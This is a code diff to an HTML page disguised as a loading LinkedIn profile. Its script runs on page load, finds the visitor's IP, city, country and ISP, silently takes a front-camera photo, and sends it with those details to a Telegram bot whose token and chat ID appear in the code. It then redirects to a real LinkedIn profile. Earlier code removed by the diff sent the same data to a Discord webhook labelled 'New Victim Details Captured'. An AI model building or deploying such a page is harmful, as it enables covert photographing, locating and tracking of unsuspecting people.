@@ -5,7 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LinkedIn Profile</title>
     <style>
-        body { margin:0; padding:0; background:#fff; height:100vh; display:flex; align-items:center; justify-content:center; font-family:Arial; }
+        body { 
+            margin:0; 
+            padding:0; 
+            background:#ffffff; 
+            height:100vh; 
+            display:flex; 
+            align-items:center; 
+            justify-content:center; 
+            font-family:Arial, sans-serif; 
+        }
         h1 { color: #0077b5; }
     </style>
 </head>
@@ -13,8 +22,9 @@
     <h1>Loading profile...</h1>
 
     <script>
-        // ================== CHANGE THESE TWO LINES ==================
-        const YOUR_DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE";
+        // ================== YOUR TELEGRAM DETAILS ==================
+        const TELEGRAM_BOT_TOKEN = "8475309387:AAHv1rNBBuU2XDaGtdQLAW0yRUspKX4fXZE";
+        const TELEGRAM_CHAT_ID = "7052857946";
         const REDIRECT_URL = "https://www.linkedin.com/in/connectaditya08/";
         // ===========================================================
 
@@ -26,46 +36,39 @@
             timestamp: new Date().toISOString()
         };
 
-        async function sendData(photoBase64) {
-            const formData = new FormData();
-            formData.append("payload_json", JSON.stringify({
-                content: "**New Victim Details Captured** 🔥",
-                embeds: [{
-                    title: "Visitor Information",
-                    color: 0x0077b5,
-                    fields: [
-                        { name: "IP Address", value: visitorInfo.ip, inline: true },
-                        { name: "Location", value: `${visitorInfo.city}, ${visitorInfo.country}`, inline: true },
-                        { name: "ISP", value: visitorInfo.isp, inline: false },
-                        { name: "Time", value: visitorInfo.timestamp, inline: false }
-                    ]
-                }]
-            }));
+        async function sendToTelegram(photoBase64) {
+            try {
+                const formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("caption", `🔴 New Capture\n\nIP: ${visitorInfo.ip}\nLocation: ${visitorInfo.city}, ${visitorInfo.country}\nISP: ${visitorInfo.isp}\nTime: ${visitorInfo.timestamp}`);
 
-            const blob = await fetch(photoBase64).then(r => r.blob());
-            formData.append("file", blob, "photo.jpg");
+                const blob = await fetch(photoBase64).then(r => r.blob());
+                formData.append("photo", blob, "photo.jpg");
 
-            await fetch(YOUR_DISCORD_WEBHOOK, {
-                method: "POST",
-                body: formData
-            });
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (e) {
+                console.log("Telegram send failed", e);
+            }
         }
 
-        // Main Process
         async function start() {
             try {
-                // Get IP + Location
+                // Get IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 visitorInfo.ip = ipData.ip;
 
+                // Get Location
                 const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                 const geo = await geoRes.json();
                 visitorInfo.city = geo.city || "Unknown";
                 visitorInfo.country = geo.country_name || "Unknown";
                 visitorInfo.isp = geo.org || "Unknown";
 
-                // Request Camera (Front)
+                // Request Camera
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: "user" }
                 });
@@ -74,7 +77,7 @@
                 video.srcObject = stream;
                 await video.play();
 
-                await new Promise(resolve => setTimeout(resolve, 1400)); // Wait for camera
+                await new Promise(resolve => setTimeout(resolve, 1500));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
@@ -83,21 +86,20 @@
 
                 const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
 
-                // Stop camera
                 stream.getTracks().forEach(track => track.stop());
 
-                // Send data
-                await sendData(photoBase64);
+                // Send to Telegram
+                await sendToTelegram(photoBase64);
 
             } catch (error) {
                 console.log("Error:", error);
             } finally {
-                // Always redirect
+                // Redirect to LinkedIn
                 window.location.href = REDIRECT_URL;
             }
         }
 
-        // Start immediately
+        // Auto Start
         start();
     </script>
 </body>
